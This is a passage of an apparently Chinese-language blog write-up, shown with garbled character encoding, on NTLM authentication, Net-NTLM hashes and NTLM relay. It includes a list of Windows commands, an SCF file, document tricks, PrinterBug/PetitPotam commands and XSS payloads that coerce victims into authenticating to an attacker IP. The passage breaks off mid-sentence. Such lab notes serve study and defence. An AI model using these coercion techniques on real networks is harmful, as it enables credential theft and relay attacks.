å‡ºç°ä¹‹å‰Windows ä½¿ç”¨çš„éªŒè¯æœºåˆ¶ã€‚LM è‡ªèº«å­˜åœ¨çš„ç¼ºé™·ä½¿å¾—LM Hash åŠ å¯†å¼ºåº¦ä¸é«˜ï¼Œä»¥è‡³å¾ˆå®¹æ˜“è¢«ç ´è§£ï¼Œæ‰€ä»¥ LM é€æ¸è¢« NTLM æ‰€æ·˜æ±°ã€‚NTLMæœ‰ NTLM v1ã€NTLM v2ã€NTLM v2Session ä¸‰ä¸ªç‰ˆæœ¬ï¼Œç›®å‰ä½¿ç”¨æœ€å¤šçš„æ˜¯ NTLM v2 ç‰ˆæœ¬ã€‚</p><h1><span id="ntlmè®¤è¯æœºåˆ¶">NTLMè®¤è¯æœºåˆ¶</span></h1><h2><span id="ntlmåœ¨å·¥ä½œç»„ç¯å¢ƒçš„è®¤è¯">NTLMåœ¨å·¥ä½œç»„ç¯å¢ƒçš„è®¤è¯</span></h2><p>NTLMé‡‡ç”¨äº†ä¸€ç§ä¸€ç§åŸºäºè´¨è¯¢&#x2F;åº”ç­”æ¨¡å¼çš„èº«ä»½éªŒè¯æœºåˆ¶ï¼Œè®¤è¯è¿‡ç¨‹ä¼šäº§ç”Ÿä¸‰ç§ç±»å‹çš„æ¶ˆæ¯ï¼š</p><p>TYPE1ï¼Œåå•†(Negotiate);TYPE 2ï¼Œè´¨è¯¢(Challenge);TYPE 3ï¼Œèº«ä»½éªŒè¯(Authenticate)</p><p><img src="http://cdn.clown2024.cn/202407151446350.png" alt="image-20240517103005341"></p><p>å…·ä½“è¿‡ç¨‹ï¼š</p><ol><li>å½“å®¢æˆ·ç«¯è¦è®¿é—®æœåŠ¡å™¨ä¸ŠæŸä¸ªå—ä¿æŠ¤çš„æœåŠ¡æ—¶ï¼Œéœ€è¦è¾“å…¥æœåŠ¡å™¨çš„ç”¨æˆ·åå’Œå¯†ç è¿›è¡ŒéªŒè¯ã€‚æ­¤æ—¶å®¢æˆ·ç«¯ä¼šåœ¨æœ¬åœ°ç¼“å­˜ä¸€ä»½æœåŠ¡å™¨å¯†ç çš„ NTLM Hashï¼Œç„¶åå‘æœåŠ¡å™¨å‘é€TYPE1Negotiate æ¶ˆæ¯ã€‚è¯¥æ¶ˆæ¯ä¸­åŒ…å«ä¸€ä¸ªä»¥æ˜æ–‡è¡¨ç¤ºçš„ç”¨æˆ·åä»¥åŠå…¶ä»–åå•†ä¿¡æ¯ï¼Œå¦‚éœ€è¦è®¤è¯çš„ä¸»ä½“å’Œéœ€è¦ä½¿ç”¨çš„æœåŠ¡ç­‰ã€‚</li><li>æœåŠ¡å™¨æ”¶åˆ°å®¢æˆ·ç«¯å‘é€çš„ TYPE1æ¶ˆæ¯åï¼Œå…ˆåˆ¤æ–­æœ¬åœ°è´¦æˆ·ä¸­æ˜¯å¦æœ‰ TYPE1æ¶ˆæ¯ä¸­çš„ç”¨æˆ·åã€‚å¦‚æœæœ‰,æœåŠ¡å™¨å°±ä¼šé€‰å‡ºè‡ªå·±èƒ½å¤Ÿæ”¯æŒå’Œæä¾›çš„æœåŠ¡å†…å®¹,ç”Ÿæˆå¹¶å›å¤ TYPE2 Challenge æ¶ˆæ¯ã€‚è¯¥æ¶ˆæ¯ä¸­åŒ…å«äº†ä¸€ä¸ªç”±æœåŠ¡ç«¯ç”Ÿæˆçš„ 16 ä½éšæœºå€¼ Challengeï¼ŒæœåŠ¡å™¨ä¹Ÿä¼šåœ¨æœ¬åœ°ç¼“å­˜è¯¥å€¼ã€‚</li><li>å®¢æˆ·ç«¯æ”¶åˆ° TYPE 2æ¶ˆæ¯åï¼Œä¼šä½¿ç”¨æ­¥éª¤1ä¸­ç¼“å­˜çš„æœåŠ¡å™¨çš„ NTLM Hash å¯¹Challenge è¿›è¡ŒåŠ å¯†å¹¶ç”ŸæˆResponseï¼Œç„¶åå°†Responseã€ç”¨æˆ·åå’ŒChallenge ç­‰ç»„åˆå¾—åˆ° Net-NTLM Hashï¼Œå†å°† Net-NTLM Hash å°è£…åˆ° TYPE3 Authenticate æ¶ˆæ¯ä¸­å‘å¾€æœåŠ¡å™¨ã€‚</li><li>æœåŠ¡å™¨åœ¨æ”¶åˆ° TYPE3æ¶ˆæ¯å,ç”¨è‡ªå·±å¯†ç çš„NTLMHashå¯¹ Challenge è¿›è¡ŒåŠ å¯†å¹¶æ¯”è¾ƒè‡ªå·±è®¡ç®—çš„ Response ä¸å®¢æˆ·ç«¯å‘é€çš„ Response æ˜¯å¦ä¸€è‡´ã€‚å¦‚æœä¸€è‡´ï¼Œå°±è¯æ˜å®¢æˆ·ç«¯æŒæ¡äº†æœåŠ¡å™¨çš„å¯†ç ï¼Œè®¤è¯æˆåŠŸï¼Œå¦åˆ™è®¤è¯å¤±è´¥ã€‚</li></ol><h2><span id="ntlmåœ¨åŸŸç¯å¢ƒçš„è®¤è¯">NTLMåœ¨åŸŸç¯å¢ƒçš„è®¤è¯</span></h2><p>åŸŸç¯å¢ƒä¸­ï¼ŒåŸŸç”¨æˆ·çš„å“ˆå¸Œå€¼éƒ½å­˜å‚¨åœ¨åŸŸæ§çš„NTDS.ditä¸­ï¼ŒæœåŠ¡å™¨æœ¬èº«æ— æ³•è®¡ç®—Responseæ¶ˆæ¯ï¼Œå› æ­¤éœ€è¦å’ŒåŸŸæ§å»ºç«‹ä¸€ä¸ªå®‰å…¨é€šé“ï¼Œå¹¶é€šè¿‡åŸŸæ§å®Œæˆæœ€ç»ˆçš„è®¤è¯æµç¨‹ã€‚</p><p><img src="http://cdn.clown2024.cn/202407151446351.png" alt="image-20240517141109345"></p><ol><li>åŸŸç”¨æˆ·è¾“å…¥è‡ªå·±çš„è´¦å·å¯†ç ç™»å½•å®¢æˆ·ç«¯ä¸»æœºæ—¶ï¼Œå®¢æˆ·ç«¯ä¼šå°†ç”¨æˆ·è¾“å…¥çš„å¯†ç è½¬æ¢ä¸ºNTLM Hashç¼“å­˜ï¼Œå½“ç”¨æˆ·æƒ³è®¿é—®æŸå°æœåŠ¡å™¨çš„æœåŠ¡æ—¶ï¼Œå°±ä¼šå‘é€TYPE1 Negotiateæ¶ˆæ¯</li><li>åŒå·¥ä½œç»„ç¯å¢ƒä¸­çš„è®¤è¯</li><li>åŒå·¥ä½œç»„ç¯å¢ƒä¸­çš„è®¤è¯</li><li>æœåŠ¡å™¨æ”¶åˆ°TYPE3 æ¶ˆæ¯ä¹‹åä¼šè½¬å‘ç»™åŸŸæ§</li><li>åŸŸæ§æ ¹æ®TYPE3æ¶ˆæ¯è·å–å¯¹åº”ç”¨æˆ·çš„æœ¬åœ°å­˜å‚¨NTLM Hashï¼Œç„¶åå¯¹åŸå§‹Challengeè®¡ç®—ç”ŸæˆResponseï¼Œç„¶åå’ŒTYPE3æ¶ˆæ¯ä¸­çš„Responseæ¯”å¯¹</li><li>æœåŠ¡å™¨æ ¹æ®åŸŸæ§è¿”å›çš„éªŒè¯ç»“æœï¼Œå¯¹å®¢æˆ·ç«¯è¿›è¡Œå›å¤</li></ol><h2><span id="net-ntlm-hash">Net-NTLM Hash</span></h2><h3><span id="net-ntlm-hashç»„æˆ">Net-NTLM Hashç»„æˆ</span></h3><p>Net-NTLM Hashæ˜¯ä¸Šé¢TYPE3æ¶ˆæ¯ä¸­åŒ…å«çš„ï¼Œæ˜¯åœ¨ç½‘ç»œç¯å¢ƒä¸‹NTLMè®¤è¯çš„å“ˆå¸Œå€¼ã€‚åœ¨NTLM  v1å’ŒNTLM v2ä¸­ï¼ŒNet-NTLM Hashä¹Ÿå¯ä»¥åˆ†ä¸ºv1å’Œv2ä¸¤ä¸ªç‰ˆæœ¬ï¼Œæ„æˆå¦‚ä¸‹ï¼š</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext"># Net-NTLM Hash v1<br>uername::hostname::LM response:NTLM response:challenge<br># Net-NTLM Hash v2<br>username::domain:challenge:HMAC-MD5:blob<br></code></pre></td></tr></table></figure><p>å¯ä»¥ä»NTLMè®¤è¯çš„æ•°æ®åŒ…ä¸­æå–Net-NTLM Hashï¼Œä¸‹é¢æ˜¯Net-NTLM Hash v2çš„æå–è¿‡ç¨‹</p><ol><li><p>ä»TYPE 2 æ¶ˆæ¯çš„æ•°æ®åŒ…ä¸­æå–å¾—åˆ°Challenge</p><p><img src="http://cdn.clown2024.cn/202407151446352.png" alt="image-20240517154219376"></p></li><li><p>HMAC-MD5å¯¹åº”TYPE3æ•°æ®åŒ…ä¸­çš„NTProofStr</p><p><img src="http://cdn.clown2024.cn/202407151446353.png" alt="image-20240517154324541"></p></li><li><p>User nameå’ŒDomainåœ¨TYPE3æ•°æ®åŒ…ä¸­éƒ½å¯ä»¥æ‰¾åˆ°ï¼Œblobä¸ºæ•°æ®åŒ…ä¸­çš„Responseå‡å»NTProofStråå‰©ä¸‹çš„éƒ¨åˆ†</p><p><img src="http://cdn.clown2024.cn/202407151446354.png" alt="image-20240517154720777"></p></li><li><p>å†æ ¹æ®Net-NTLM Hash v2çš„æ„æˆå°†ä¸Šé¢çš„æ•°æ®ç»„åˆèµ·æ¥å³å¯</p><p><img src="http://cdn.clown2024.cn/202407151446355.png" alt="image-20240517154802759"></p></li></ol><h3><span id="net-ntlm-hashåˆ©ç”¨">Net-NTLM Hashåˆ©ç”¨</span></h3><p>å®æˆ˜ä¸­å¯ä»¥é€šè¿‡ä¸­é—´äººçš„æ–¹æ³•æˆªè·è®¤è¯è¯·æ±‚è·å¾—Net-NTLM Hashï¼Œç„¶åå¯ä»¥æš´åŠ›ç ´è§£å¹¶è·å¾—å®¢æˆ·ç«¯ç”¨æˆ·çš„æ˜æ–‡å¯†ç ã€‚</p><p>è¿™é‡Œæœ‰å¦ä¸€ç§åˆ©ç”¨æ–¹æ³•ï¼Œ<strong>NTLM Relay</strong>ã€‚</p><p>NTLM Relayæ”»å‡»å°±æ˜¯é€šè¿‡ä¸­é—´äººå¯¹NTLMè®¤è¯è¿‡ç¨‹çš„æµé‡è¿›è¡Œè½¬å‘ï¼Œä»è€Œå…è®¸ä¸­é—´äººä½¿ç”¨å®¢æˆ·ç«¯çš„èº«ä»½è®¤è¯æœåŠ¡ï¼Œè¿‡ç¨‹å¦‚å›¾æ‰€ç¤ºï¼š</p><p><img src="http://cdn.clown2024.cn/202407151446356.png" alt="image-20240517155502009"></p><p>è¦å®ç°è¯¥è¿‡ç¨‹ï¼Œè¦å…ˆè§£å†³å¦‚ä½•è§¦å‘å®¢æˆ·ç«¯å‘Attackerå‘èµ·NTLMè®¤è¯è¯·æ±‚ï¼Œå…¶æ¬¡è¦å†³å®šå°†å®¢æˆ·ç«¯çš„è¯·æ±‚æ‹¦æˆªåè®¤è¯åˆ°ä»€ä¹ˆæ ·çš„æœåŠ¡ã€‚</p><h1><span id="å‘èµ·å¹¶æˆªè·ntlmè¯·æ±‚">å‘èµ·å¹¶æˆªè·NTLMè¯·æ±‚</span></h1><p>NTLM æ˜¯ä¸€ç§åµŒå…¥å¼åè®®ï¼Œæ¶ˆæ¯çš„ä¼ è¾“ä¾èµ–ä½¿ç”¨ NTLM è¿›è¡Œè®¤è¯çš„ä¸Šå±‚åè®®ï¼Œå¦‚SMBã€LDAPã€HTTPã€MSSQL ç­‰ã€‚å› æ­¤ï¼Œåªè¦æ˜¯ä½¿ç”¨è¿™äº›åè®®çš„åº”ç”¨ç¨‹åºéƒ½å¯ä»¥è¦æ±‚ç”¨æˆ·å‘èµ· NTLM è¯·æ±‚ã€‚æµ‹è¯•äººå‘˜å¯é€šè¿‡ Responder ç­‰å·¥å…·å¯¹ç”¨æˆ·çš„ NTLM è®¤è¯è¯·æ±‚è¿›è¡Œæ‹¦æˆªï¼Œå¹¶è·å–å…¶ Net-NTLM Hashã€‚</p><p>Responder æ˜¯ä¸€æ¬¾å¯ä»¥åœ¨å±€åŸŸç½‘æ¨¡æ‹Ÿå„ç§æœåŠ¡å™¨(SMBã€LDAPã€HTTPã€MSSQLã€WPADã€FTPã€POP3ã€IMAPã€SMTP)è¿›è¡Œä¸­é—´äººæ”»å‡»çš„å·¥å…·ï¼Œå½“ç”¨æˆ·è¿æ¥è¿™äº›æœåŠ¡å™¨æ—¶ï¼Œè¯¥å·¥å…·å°†æˆªè·ç”¨æˆ·çš„è®¤è¯è¯·æ±‚ï¼Œå¦‚å›¾æ‰€ç¤ºï¼š</p><p><img src="http://cdn.clown2024.cn/202407151446357.png" alt="image-20240517160601855"></p><p><img src="http://cdn.clown2024.cn/202407151446358.png" alt="image-20240517160627078"></p><blockquote><p>kaliä¸­å·²ç»é»˜è®¤å®‰è£…äº†responderå¯ä»¥ç›´æ¥ä½¿ç”¨ï¼Œéœ€è¦rootæƒé™è¿è¡Œ</p></blockquote><h2><span id="ntlmæ”»å‡»å¸¸ç”¨æ–¹æ³•">NTLMæ”»å‡»å¸¸ç”¨æ–¹æ³•</span></h2><p>åœ¨Windowsä¸­ï¼Œé€šè¿‡è®¾ç½®æŒ‡å‘æ¶æ„æœåŠ¡å™¨çš„UNCè·¯å¾„ï¼Œèƒ½å¤Ÿä½¿å—å®³æœºå™¨è‡ªåŠ¨ä½¿ç”¨å½“å‰ç”¨æˆ·å‡­è¯å‘æ¶æ„æœåŠ¡å™¨å‘èµ·NTLMè®¤è¯</p><h3><span id="ç³»ç»Ÿå‘½ä»¤">ç³»ç»Ÿå‘½ä»¤</span></h3><p>å¾ˆå¤šç³»ç»Ÿå‘½ä»¤éƒ½å¯ä»¥ä¼ å…¥UNCè·¯å¾„ï¼Œè¿™é‡Œåˆ—ä¸¾å¸¸ç”¨çš„å‘½ä»¤</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">net use \\10.10.10.147\share<br><span class="hljs-built_in">dir</span> \\10.10.10.147\share<br>attrib \\10.10.10.147\share<br>bcdboot \\10.10.10.147\share<br>bdeunlock \\10.10.10.147\share<br>cacls \\10.10.10.147\share<br>certreq \\10.10.10.147\share<br>certutil \\10.10.10.147\share<br>cipher \\10.10.10.147\share<br>ClipUp -l \\10.10.10.147\share<br>cmdl32 \\10.10.10.147\share<br>cmstp /s \\10.10.10.147\share<br>colorcpl \\10.10.10.147\share<br>comp /N=0 \\10.10.10.147\share<br>compact \\10.10.10.147\share<br>control \\10.10.10.147\share<br>Defrag \\10.10.10.147\share<br>diskperf \\10.10.10.147\share<br>dispdiag -out \\10.10.10.147\share<br>doskey /MACROFILE=\\10.10.10.147\share<br>esentutl /k \\10.10.10.147\share<br><span class="hljs-built_in">expand</span> \\10.10.10.147\share<br>extract32 \\10.10.10.147\share<br>FileHistory \\10.10.10.147\share<br>findstr * \\10.10.10.147\share<br>fontview \\10.10.10.147\share<br>fvenotify \\10.10.10.147\share<br>FXSCOVER \\10.10.10.147\share<br>hwrcomp -check \\10.10.10.147\share<br>hwrreg \\10.10.10.147\share<br>icacls \\10.10.10.147\share<br>licensingdiag -cab \\10.10.10.147\share<br>lodctr \\10.10.10.147\share<br>lpksetup /p \\10.10.10.147\share /s<br>makecab \\10.10.10.147\share<br>msiexec /update \\10.10.10.147\share /quiet<br>msinfo32 \\10.10.10.147\share<br>mspaint \\10.10.10.147\share<br>msra /openfile \\10.10.10.147\share<br>mstsc \\10.10.10.147\share<br>netcfg -l \\10.10.10.147\share -c p -i foo<br></code></pre></td></tr></table></figure><p>è¿™é‡Œç”¨net useå‘½ä»¤æ¥æµ‹è¯•ä¸€ä¸‹</p><p><img src="http://cdn.clown2024.cn/202407151446359.png" alt="image-20240517162021631"></p><p><img src="http://cdn.clown2024.cn/202407151446360.png" alt="image-20240517162105436"></p><p>æˆ‘ä»¬è¿™é‡ŒæˆåŠŸæˆªè·åˆ°äº†Net-NTLM Hash v2</p><h3><span id="desktopiniæ–‡ä»¶">Desktop.iniæ–‡ä»¶</span></h3><p>Windowsç³»ç»Ÿæ–‡ä»¶å¤¹ä¸‹æœ‰ä¸€ä¸ªéšè—æ–‡ä»¶ desktop.ini,ç”¨æ¥æŒ‡å®šå’Œå­˜å‚¨æ–‡ä»¶å¤¹å›¾æ ‡ä¹‹ç±»çš„ä¸ªæ€§åŒ–è®¾ç½®</p><p>å¦‚å›¾ï¼Œdesktop.iniä¸­çš„IconResourceä¸ºæ–‡ä»¶å¤¹çš„å›¾æ ‡è·¯å¾„ï¼Œå¯ä»¥æ”¹ä¸ºUNCè·¯å¾„å¹¶æŒ‡å‘æ¶æ„æœåŠ¡å™¨ã€‚å½“ç”¨æˆ·è®¿é—®è¯¥æ–‡ä»¶å¤¹æ—¶å°†è‡ªåŠ¨è¯·æ±‚æ¶æ„æœåŠ¡å™¨ä¸Šçš„å›¾æ ‡èµ„æºï¼ŒResponderå³å¯æˆªè·ç”¨æˆ·çš„Net-NTLM Hash</p><p><img src="http://cdn.clown2024.cn/202407151446361.png" alt="image-20240517163327639"></p><p><img src="http://cdn.clown2024.cn/202407151446362.png" alt="image-20240517163336432"></p><p><img src="http://cdn.clown2024.cn/202407151446363.png" alt="image-20240517163408543"></p><p>æˆ‘ä»¬æµ‹è¯•çš„æ—¶å€™å¯ä»¥æ–°å»ºä¸€ä¸ªæ–‡ä»¶å¤¹ï¼Œç„¶åä¿®æ”¹æ”¹æ–‡ä»¶å¤¹ä¸ºéšä¾¿ä¸€ä¸ªå›¾æ ‡å°±ä¼šå‡ºç°desktop.iniæ–‡ä»¶ï¼Œç„¶åå°±å¯ä»¥ä¿®æ”¹äº†(è¦æŠŠéšè—é‡è¦ç³»ç»Ÿæ–‡ä»¶å…³æ‰æ‰ä¼šå‡ºç°)</p><blockquote><p>æˆ‘è‡ªå·±æµ‹è¯•çš„æ—¶å€™å¤ç°å¤±è´¥äº†ä¸çŸ¥é“ä¸ºä»€ä¹ˆ</p></blockquote><h3><span id="scfæ–‡ä»¶">SCFæ–‡ä»¶</span></h3><p>SCF æ–‡ä»¶æ˜¯ Windows æ–‡ä»¶èµ„æºç®¡ç†å™¨å‘½ä»¤æ–‡ä»¶ï¼Œä¹Ÿæ˜¯ä¸€ç§å¯æ‰§è¡Œæ–‡ä»¶ã€‚è¯¥æ–‡ä»¶ä¸­çš„IconFile å±æ€§å¯ä»¥æŒ‡å®š UNC è·¯å¾„ï¼ŒWindows æ–‡ä»¶èµ„æºç®¡ç†å™¨å°†å°è¯•åŠ è½½ IconFile å±æ€§æŒ‡å®šçš„æ–‡ä»¶å›¾æ ‡ã€‚</p><p>åœ¨ä¸€ä¸ªæ–‡ä»¶å¤¹ä¸‹æ–°å»ºä¸€ä¸ªtest.scfæ–‡ä»¶ï¼Œå†™å…¥ä¸‹é¢å†…å®¹ï¼š</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">[Shell]<br>Command=2<br>IconFile=\\192.168.20.128\share\test.ico<br>[Taskbar]<br>Command=TogleDesktop<br></code></pre></td></tr></table></figure><p>ç„¶åè®¿é—®æ–‡ä»¶å¤¹å³å¯æˆªè·</p><blockquote><p>è¿™é‡Œä¹Ÿå¤ç°å¤±è´¥äº†å¥‡æ€ªäº†</p></blockquote><h3><span id="pdfæ–‡ä»¶">PDFæ–‡ä»¶</span></h3><p>PDF è§„èŒƒå…è®¸ä¸º GoTobe å’Œ GoTORæ¡ç›®åŠ è½½è¿œç¨‹å†…å®¹ã€‚æµ‹è¯•äººå‘˜å¯ä»¥åœ¨ PDF æ–‡ä»¶ä¸­æ’å…¥ UNC è·¯å¾„ï¼Œå½“ç”¨æˆ·é€šè¿‡ PDF é˜…è¯»å™¨(Adobe Reader)æ‰“å¼€ PDF æ–‡æ¡£æ—¶ï¼Œå°†å‘æ¶æ„æœåŠ¡å™¨å‘èµ· NTLM è®¤è¯è¯·æ±‚ã€‚</p><p>ç›¸å…³åˆ©ç”¨å·¥å…·æœ‰Bad-PDFå’ŒWorse-PDF</p><p>ä»¥badpdfä¸ºä¾‹</p><p><img src="http://cdn.clown2024.cn/202407151446364.png" alt="image-20240517174014128"></p><p>ç„¶åå°†ç”Ÿæˆçš„test.pdfä¸Šä¼ åˆ°å—å®³æœºï¼Œç”¨Adobe Readeræ‰“å¼€æ–‡ä»¶åï¼Œè€Œå·²æœåŠ¡å™¨å°±ä¼šæˆªè·ç”¨æˆ·çš„Net-NTLM Hashã€‚emmmä½†æ˜¯æ„Ÿè§‰é€‚ç”¨é¢æœ‰ç‚¹çª„ï¼Œåªæœ‰Adobe Readeræ‰“å¼€æ‰å‘èµ·NTLMè¯·æ±‚ï¼Œæ­£å¸¸æµè§ˆå™¨æ‰“å¼€æ— äº‹å‘ç”Ÿã€‚</p><p>è€Œä¸”å¤šå¹´å‰å°±å‡ºç°è¡¥ä¸äº†æ„Ÿè§‰åŸºæœ¬æ²¡ç”¨äº†å±äºæ˜¯</p><h3><span id="officeæ–‡æ¡£">Officeæ–‡æ¡£</span></h3><p>Office æ–‡æ¡£çš„ document.xml.rels æ–‡ä»¶å¯ä»¥æ’å…¥ UNC è·¯å¾„ï¼Œå¹¶å‘ UNC åœ°å€æŒ‡å®šçš„æœåŠ¡å™¨å‘èµ· NTLM è¯·æ±‚ã€‚</p><p>åˆ¶ä½œæµç¨‹å¦‚ä¸‹ï¼š</p><ol><li><p>æ–°å»ºä¸€ä¸ªWordæ–‡æ¡£ï¼Œä»»æ„æ’å…¥ä¸€å¼ å›¾ç‰‡åä¿å­˜ï¼Œç”¨å‹ç¼©è½¯ä»¶æ‰“å¼€</p></li><li><p>åœ¨word&#x2F;_relsä¸‹æ‰¾åˆ°document.xml.relsæ–‡ä»¶ï¼Œæ‰¾åˆ°åˆšæ‰æ’å…¥å›¾ç‰‡å¯¹åº”çš„Targetå‚æ•°ï¼Œå°†å…¶ä¿®æ”¹ä¸ºæŒ‡å‘è€Œå·²æœåŠ¡å™¨çš„UNCè·¯å¾„ï¼Œå¹¶åŠ ä¸ŠTargetMode&#x3D;â€Externalâ€å±æ€§</p><p><img src="http://cdn.clown2024.cn/202407151446365.png" alt="image-20240517175701097"></p><p><img src="http://cdn.clown2024.cn/202407151446366.png" alt="image-20240517175820073"></p></li><li><p>å°†è¯¥æ–‡ä»¶ä¸Šä¼ åˆ°å—å®³æœºå™¨ï¼Œæ–‡ä»¶è¢«æ‰“å¼€åå°±å¯ä»¥æˆªè·åˆ°Net-NTLM Hash</p></li></ol><blockquote><p>éš¾ç»·åˆå¤ç°å¤±è´¥äº†ã€‚ã€‚ã€‚ä¸çŸ¥é“æ˜¯ä¸æ˜¯åªé€‚åˆæ—§ç‰ˆæœ¬çš„office</p></blockquote><h3><span id="privexchangeæ¼æ´">PrivExchangeæ¼æ´</span></h3><p>Microsoft Exchange å…è®¸ä»»æ„å…³è”äº†Exchange é‚®ç®±çš„ç”¨æˆ·é€šè¿‡EWSæ¥å£æ¥åˆ›å»ºä¸€ä¸ªæ¨é€è®¢é˜…(Push Subscription)ï¼Œå¹¶å¯ä»¥æŒ‡å®šä»»æ„ URL ä½œä¸ºé€šçŸ¥æ¨é€çš„ç›®çš„åœ°ã€‚</p><p>å½“è§¦å‘é€šçŸ¥æ¨é€æ—¶ï¼ŒExchange å°†ä½¿ç”¨ CredentialCache.DefaultCredentials å‘å‡º HTTP è¯·æ±‚ï¼Œå¹¶ä»¥æœºå™¨è´¦æˆ·çš„èº«ä»½å‘èµ· NTLM è®¤è¯ã€‚è¯¥æ¼æ´æœ¬è´¨æ˜¯ä¸€ä¸ª SSRFã€‚</p><p>å…·ä½“çš„ä½¿ç”¨å¯ä»¥ç½‘ä¸Šæ‰¾POCéªŒè¯ã€‚</p><h3><span id="printerbugæ¼æ´">PrinterBugæ¼æ´</span></h3><p>Windows ä¸­çš„MS-RPRN(Print System Remote Protocolï¼Œæ‰“å°ç³»ç»Ÿè¿œç¨‹åè®®)ç”¨äºæ‰“å°å®¢æˆ·ç«¯å’Œæ‰“å°æœåŠ¡å™¨ä¹‹é—´çš„é€šä¿¡ï¼Œæ”¯æŒå®¢æˆ·ç«¯å’ŒæœåŠ¡å™¨ä¹‹é—´çš„åŒæ­¥æ‰“å°å’Œè”æœºæ“ä½œåŒ…æ‹¬æ‰“å°ä»»åŠ¡æ§åˆ¶ã€æ‰“å°ç³»ç»Ÿç®¡ç†ã€‚</p><p>MS-RPRN ä¸­å®šä¹‰çš„RpcRemoteFindFirstPrinterChangeNotification APIå¯ä»¥åˆ›å»ºè¿œç¨‹ä¿®æ”¹é€šçŸ¥å¯¹è±¡ï¼Œç”¨äºç›‘æ§å¯¹æ‰“å°æœºå¯¹è±¡çš„ä¿®æ”¹ï¼Œå¹¶å‘æ‰“å°å®¢æˆ·ç«¯å‘é€ä¿®æ”¹é€šçŸ¥ã€‚ä»»ä½•å…·å¤‡åŸŸç”¨æˆ·æƒé™çš„æµ‹è¯•äººå‘˜éƒ½å¯ä»¥æ»¥ç”¨è¯¥æ–¹æ³•æ¥å¼ºè¿«è¿è¡Œæ‰“å°æœåŠ¡(PrintSpooler)çš„ä¸»æœºå‘æ¶æ„æœåŠ¡å™¨å‘èµ· Kerberos æˆ– NTLM èº«ä»½è®¤è¯è¯·æ±‚ã€‚å¹¶ä¸”ï¼Œç”±äº Print Spooler æœåŠ¡ä»¥NTAUTHORITY\SYSTEM è´¦æˆ·çš„èº«ä»½è¿è¡Œ,å› æ­¤æœ€ç»ˆé€šè¿‡ Responder æˆªè·çš„æ˜¯ç›®æ ‡æœºå™¨è´¦æˆ·çš„ Net-NTMLHashã€‚å¾®è½¯å¹¶ä¸æ‰¿è®¤è¿™æ˜¯ä¸€ä¸ªæ´ï¼Œæ‰€ä»¥æœªè¿›è¡Œä»»ä½•ä¿®å¤ã€‚</p><p>ç›¸å…³åˆ©ç”¨å·¥å…·æœ‰SpoolSample.exeå’ŒPrinterbug.pyï¼Œå¼€å¯Responderç›‘å¬åï¼Œæ‰§è¡Œä¸‹é¢å‘½ä»¤ï¼š</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">python printerbug.py hack-my.com/Marcus:Marcus\@123@10.10.10.20 10.10.10.147<br></code></pre></td></tr></table></figure><p>é€šè¿‡ printerbugÂ·py è¿æ¥åˆ°å—å®³æœºå™¨(10.10.10.20)ï¼Œä»¥è¿«ä½¿å®ƒå‘æµ‹è¯•äººå‘˜æ‰€æ§çš„æ¶æ„æœåŠ¡å™¨(10.10.10.147)å‘èµ· NTLM è®¤è¯ã€‚Responder ä¸ŠæˆåŠŸæˆªè·å—å®³æœºå™¨çš„ Net-NTML Hash</p><p><img src="http://cdn.clown2024.cn/202407151446367.png" alt="image-20240517183241095"></p><h3><span id="petitpotamæ¼æ´">PetitPotamæ¼æ´</span></h3><p>å½“Print SpooleræœåŠ¡è¢«å…³é—­åï¼ŒPrinterBugæ¼æ´å°±æ— æ³•åˆ©ç”¨ï¼Œè¯¥æ¼æ´å¯ä»¥ç”¨äºæ›¿ä»£PrinterBugæ–¹æ³•ã€‚</p><p>MS-EFSRä¸­æœ‰ä¸€ç»„APIï¼Œå¯é€šè¿‡FileNameå‚æ•°æŒ‡å®šUNC è·¯å¾„ã€‚ä¾‹å¦‚ï¼ŒEfsRpcOpenFileRaw APIçš„è¯­æ³•æ ¼å¼å¦‚ä¸‹ï¼Œå¯ä»¥æ‰“å¼€æœåŠ¡å™¨ä¸Šçš„åŠ å¯†å¯¹è±¡è¿›è¡Œå¤‡ä»½æˆ–è¿˜åŸã€‚</p><p><img src="http://cdn.clown2024.cn/202407151446369.png" alt="image-20240517183953529"></p><p>PetitPotamå°±æ˜¯é€šè¿‡åˆ©ç”¨è¿™äº›APIæ¥å‘æ¶æ„æœåŠ¡å™¨å‘èµ·NTLMè®¤è¯è¯·æ±‚ï¼Œç„¶åæˆªè·Net-NTLM Hash</p><p>ä¸PrinterBugä¸€æ ·ï¼ŒPetitPotamä¹Ÿéœ€è¦æœ‰ä¸€ä¸ªåŸŸç”¨æˆ·æƒé™ã€‚</p><p>æ³¨æ„ï¼Œåœ¨ Windows Server 2008&#x2F;2012 ä¸Šï¼Œç”±äºå¯åŒ¿åè®¿é—®çš„å‘½åç®¡é“é»˜è®¤ä¸ä¸ºç©ºï¼Œå› æ­¤å¯¼è‡´å¯ä»¥åŒ¿åè§¦å‘ã€‚</p><p>å¼€å¯ç›‘å¬æ‰§è¡Œä¸‹é¢å‘½ä»¤ï¼š</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">python PetitPotam.py -d hack-my.com -u Marcus -p Marcus\@123 10.10.10.147 10.10.10.20<br></code></pre></td></tr></table></figure><p><img src="http://cdn.clown2024.cn/202407151446370.png" alt="image-20240517184536531"></p><h2><span id="å¸¸è§webæ¼æ´åˆ©ç”¨">å¸¸è§Webæ¼æ´åˆ©ç”¨</span></h2><h3><span id="xss">XSS</span></h3><p><strong>æ„é€ UNCè·¯å¾„ï¼Œè§¦å‘SMBè¯·æ±‚å¹¶å‘æ¶æ„æœåŠ¡å™¨å‘èµ·NTLMè®¤è¯</strong></p><figure class="highlight js"><table><tr><td class="code"><pre><code class="hljs js"># ä½¿ç”¨äº<span class="hljs-variable constant_">IE</span>æµè§ˆå™¨<br>&lt;scripts src=<span class="hljs-string">&quot;\\10.10.10.147\xss&quot;</span>&gt;&lt;/script&gt;<br># å€ŸåŠ©<span class="hljs-variable constant_">LLMNR</span>/<span class="hljs-variable constant_">NBNS</span>ï¼Œé€‚ç”¨äº<span class="hljs-variable constant_">IE</span>å’Œ<span class="hljs-title class_">Edge</span>æµè§ˆå™¨<br>&lt;scripts src=<span class="hljs-string">&quot;\\UnknownName\xss&quot;</span>&gt;&lt;/script&gt;<br></code></pre></td></tr></table></figure><blockquote><p>LLMNRï¼ˆLink-Local Multicast Name Resolutionï¼‰å’ŒNBNSï¼ˆNetBIOS Name 